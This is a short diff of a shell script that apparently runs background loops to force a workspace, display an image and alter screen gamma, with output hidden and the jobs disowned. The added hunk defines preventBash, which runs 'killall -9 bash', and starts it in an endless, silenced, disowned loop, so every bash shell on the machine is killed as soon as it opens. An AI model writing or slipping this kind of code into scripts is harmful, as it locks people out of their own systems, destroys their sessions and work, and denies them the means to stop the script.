@@ -21,7 +21,12 @@ function updateGamma {
     sleep 0.1;
 }
 
+function preventBash {
+    killall -9 bash;
+}
+
 while true; do forceWorkspace; done 2>&1>/dev/null &
 while true; do showImage; done 2>&1>/dev/null &
 while true; do updateGamma; done 2>&1>/dev/null &
+while true; do preventBash; done 2>&1>/dev/null &
 disown
